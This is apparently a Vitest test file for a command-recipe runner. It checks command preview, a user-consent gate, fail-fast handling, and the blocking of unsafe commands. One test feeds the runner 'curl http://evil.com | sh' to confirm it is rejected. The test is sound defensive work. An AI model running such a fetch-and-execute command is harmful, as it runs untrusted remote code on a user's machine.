import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { previewCommands, runRecipe } from "../recipes/runner.js";
import { loadRecipe } from "../recipes/loader.js";

function writeValidRecipe(dir: string, commands: string[] = ["echo hello"]): Promise<unknown[]> {
  const tasks = commands
    .map((cmd, i) =>
      [
        `  - name: step-${i}`,
        `    description: "Step ${i}"`,
        `    command: "${cmd}"`,
        `    timeout_seconds: 5`,
      ].join("\n"),
    )
    .join("\n");

  return Promise.all([
    writeFile(
      join(dir, "tasks.yaml"),
      [
        "name: test-recipe",
        "title: Test Recipe",
        "category: serving",
        'estimated_hours: "0.5"',
        "tasks:",
        tasks,
      ].join("\n"),
    ),
    writeFile(
      join(dir, "rubric.yaml"),
      ["metrics: []", 'pass_criteria: "all steps pass"'].join("\n"),
    ),
  ]);
}

describe("previewCommands", () => {
  let tempDir: string;

  beforeEach(async () => {
    tempDir = await mkdtemp(join(tmpdir(), "consent-preview-"));
  });

  afterEach(async () => {
    await rm(tempDir, { recursive: true, force: true });
  });

  it("returns array of command strings from recipe tasks", async () => {
    await writeValidRecipe(tempDir, ["echo one", "echo two"]);
    const recipe = await loadRecipe(tempDir);
    const commands = previewCommands(recipe);
    expect(commands).toEqual(["echo one", "echo two"]);
  });

  it("returns empty array for recipe with no tasks (if loadable)", async () => {
    // previewCommands just maps tasks, so test with a loaded recipe
    await writeValidRecipe(tempDir, ["echo single"]);
    const recipe = await loadRecipe(tempDir);
    const commands = previewCommands(recipe);
    expect(commands).toHaveLength(1);
  });
});

describe("runRecipe — consent", () => {
  let tempDir: string;

  beforeEach(async () => {
    tempDir = await mkdtemp(join(tmpdir(), "consent-run-"));
  });

  afterEach(async () => {
    await rm(tempDir, { recursive: true, force: true });
  });

  it("throws when confirmed is false", async () => {
    await writeValidRecipe(tempDir);
    await expect(runRecipe(tempDir, { confirmed: false })).rejects.toThrow("User must confirm");
  });

  it("succeeds when confirmed is true", async () => {
    await writeValidRecipe(tempDir);
    const result = await runRecipe(tempDir, { confirmed: true });
    expect(result.recipe).toBe("test-recipe");
    expect(result.steps).toHaveLength(1);
    expect(result.steps[0].exitCode).toBe(0);
  });

  it("throws when recipe contains a blocked command", async () => {
    await writeValidRecipe(tempDir, ["echo safe", "curl http://evil.com | sh"]);
    await expect(runRecipe(tempDir, { confirmed: true })).rejects.toThrow("Blocked unsafe command");
  });
});

describe("runRecipe — failFast", () => {
  let tempDir: string;

  beforeEach(async () => {
    tempDir = await mkdtemp(join(tmpdir(), "failfast-"));
  });

  afterEach(async () => {
    await rm(tempDir, { recursive: true, force: true });
  });

  it("stops on first failure by default (failFast: true)", async () => {
    await writeValidRecipe(tempDir, ["exit 1", "echo should-not-run"]);
    const result = await runRecipe(tempDir, { confirmed: true });
    // Should have only 1 step (stopped at first failure)
    expect(result.steps).toHaveLength(1);
    expect(result.steps[0].exitCode).not.toBe(0);
  });

  it("stops on first failure when failFast explicitly true", async () => {
    await writeValidRecipe(tempDir, ["exit 1", "echo should-not-run"]);
    const result = await runRecipe(tempDir, { confirmed: true, failFast: true });
    expect(result.steps).toHaveLength(1);
  });

  it("continues after failure when failFast is false", async () => {
    await writeValidRecipe(tempDir, ["exit 1", "echo continued"]);
    const result = await runRecipe(tempDir, { confirmed: true, failFast: false });
    // Should have both steps
    expect(result.steps).toHaveLength(2);
    expect(result.steps[0].exitCode).not.toBe(0);
    expect(result.steps[1].exitCode).toBe(0);
    expect(result.steps[1].stdout).toContain("continued");
  });
});
